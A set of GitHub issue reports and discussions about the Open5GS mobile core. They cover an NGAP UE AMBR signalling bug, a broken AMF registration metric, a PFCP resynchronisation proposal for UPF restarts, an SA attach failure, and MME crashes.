According to Amarisoft's support, it seems that the AMF is wrongly sending the UE Aggregate Maximum Bit Rate IE in the NGAP initial context setup request message while no PDU session is being present. 
[Initial context setup request.txt](https://github.com/open5gs/open5gs/files/6439805/Initial.context.setup.request.txt)

But as stated in 3GPP 38.413 chapter 9.2.2.1, this IE should be present if the PDU Session Resource Setup List IE is present, which is not the case. So the gNB ignores it. Later on when the PDU session is opened, the AMF does not send the UE Aggregate Maximum Bit Rate in the NGAP PDU session resource setup request message (maybe because it was already sent in the initial context setup request message). As a consequence, the gNB does not have an UE AMBR configured and so does not schedule the DL IP packets. 

[PDU session resource setup request.txt](https://github.com/open5gs/open5gs/files/6439806/PDU.session.resource.setup.request.txt)

If you modify the AMF to send the IE in the initial context setup when there is a PDU session present, and in the NGAP PDU session resource setup request message otherwise, things should work.

Best regards,
Miguel.

AMF RM metric AMF_METR_GAUGE_RM_REGISTEREDSUBNBR (RM.RegisteredSubNbrMean/Max - [ETSI TS 128 552 V16.13.0](https://www.etsi.org/deliver/etsi_ts/128500_128599/128552/16.13.00_60/ts_128552v161300p.pdf), 5.2.1 Registered subscribers measurement) does not expose proper value since **RM_State** removal in commit [9f4a9790e3cb1f7f05c8f97cf6a99c15752e05d5](https://github.com/open5gs/open5gs/commit/9f4a9790e3cb1f7f05c8f97cf6a99c15752e05d5).

AMF is not aware of UE RM state anymore.

- *amf_ue* keeps contexts of all UEs registered since startup regardless of their RM state.
- *ran_ue* keeps contexts of all CM CONNECTED UEs.
- UEs in CM IDLE state are RM REGISTERED but are not evidenced.
- GMM state of an UE, which is trying to register, always has value *gmm_state_initial_context_setup* regardless of its current RM state.

When AMF receives Registration Request due to (R)AN or UE restart, all the initial registration procedures are always carried out even if the UE has already been RM REGISTERED.
So the Registered subscribers metric is incremented unacceptably. The result is increasing of this gauge above number of all administered UEs.

items.title: feedback requested: PFCP synchronization?
items.body:
Hi everyone,

We have an architecture where the UPS (sgwu and upf) runs on a separate machine from the CPS (hss, pcrf, mme, sgwc, smf). Occasionally the UPS (or components on it) will crash and restart, and when this happens it creates all sorts of problems relating to the state mis-match between the CPS side (sgwc and smf) and UPS side (sgwu and upf). This generally stems from the fact that when the UPS side (sgwu and upf) restarts it loses all PFCP state. Already attached UEs cannot send traffic (since no session exists), UE disconnects fail, etc etc. I often end up having to restart the entire CPS to get everything back in sync.

I have dug through the relevant 3gpp docs for PFCP and GTPv2 and can't seem to find a great way to handle this situation in a clean, 3gpp-specific way. I think I have an okay idea for a solution, but want to hear ideas and collect as much input as possible before I start working on such a fix.

0) My main idea for a fix is to treat the CPS side (sgwc and smf) as authoritative. It handles all GTP traffic normally and stays in sync with mme, etc. Whenever there is a discrepancy, we assume that the CPS side is accurate. All fixes/modifications that follow are to help the UPS figure out the CPS'es state and get in sync with it.

1) From the CPS side, treat a PFCP de-association as if the UPS has crashed. "Save" all active sessions for that UPS element in a list somewhere. If we get any GTPv2 messages relating to these sessions (e.g. modify or delete), we can handle them directly, modify our saved sessions list correctly and send a successful response, but we don't forward these messages to UPS since we have no active association. New associations fail (as standard) due to lack of PFCP context.

2) From the UPS side (sgwu and upf), when you PFCP de-associate, destroy all active sessions that are associated with that CPS. This way, no matter what, when a UPS entity successfully creates a new PFCP association (either after extended network outage or a crash, it doesnt matter) the CPS can know that the UPS has zero active sessions from it.

3) When a UPS re-associates with CPS, the CPS sends create session messages for all the "saved" sessions mentioned in (1). Based on (2) we should know that at association time the UPS has no active sessions, so this should get us in sync.

4) Related, I would like to add some CPS/UPS code to handle other edge-cases by deferring to the CPS whenever possible, and keeping an eye towards state. e.g., if the CPS sends a Delete Session Request and the UPS has no session to speak of, don't error out, respond correctly, since technically the outcome is correct.

I believe this will take some work, but not too much. Please let me know what you think, or if there's another way to handle this that I haven't considered or found online - I'm super interested in finding the best way to fix this problem.

items.title: SA attach issue
items.body:
Hey @acetcom 

I've spent some time studying my SA attach issue, and have narrowed the problem down. It seems to be related to the session context...

Currently running tests with a Qualcomm x55 modem in SA mode. I get exactly the same results with the Huawei Balong 5000 in SA mode.

Fresh compile of git master; commit 22b09443ce41c34786df167916d603bd17771d69. I cleaned out MongoDB and recreated the USIM profiles.

Running all Open5GS components on the Amarisoft gNB computer, so all NFs using the default IP addresses. gNB is on `127.0.1.1`
____

### Clean Restart

- Completely restart the entire core network; ie power cycle all 5GC control plane functions + the UPF.
- Attach gNB
- Attach UE

Result = attach works first time
PCAP and all debug log files = [SA_restartAll.zip](https://github.com/open5gs/open5gs/files/6160460/SA_restartAll.zip)


After this initial successful attach,
* I can powercycle the UE and it reattaches successfully
* I can powercycle the gNB; after it does NGsetup, UE reattaches successfully

____

### Control Plane Restart

- Ok, so this time we assume something has happened with the control plane daemons, and they have restarted
- The UPF remains running (from the above test) - does not get restarted
- After the SMF comes back online, it re- PFCP associates with the UPF
- Attach gNB
- Attach UE

Result = attach fails
PCAP and all debug log files = [SA_restartAll_exceptUPF.zip](https://github.com/open5gs/open5gs/files/6160461/SA_restartAll_exceptUPF.zip)

After the UE sends `UplinkNASTransport`, SMF sends UPF a `PFCP Session Deletion Request` message. UPF responds with session context errors, then the control plane seems to stop doing anything, leading to the gNB timing out after 10 seconds and kicking the UE. The UE then goes into a cycle of failed attach requests.

This is totally repeatable, and occurs with both the Qualcomm and Huawei UEs. 

____

Not sure what you make of this? Is this expected behaviour?

Cheers
Kenny

items.body:
Hi Sukchan

I've got Open5GS running on the live testbed network now, and everything is working well; apart from the MME. For some reason, it seems to crash pretty regularly and is auto restarted by systemd. After the crash, UEs take a short time to reconnect as existing sessions become stale etc, so it is affecting trialist experience a little.

As I was aware this was happening, I ran the MME with debug logging switched on, to see if this would catch the problem, but I cant see anything obvious.
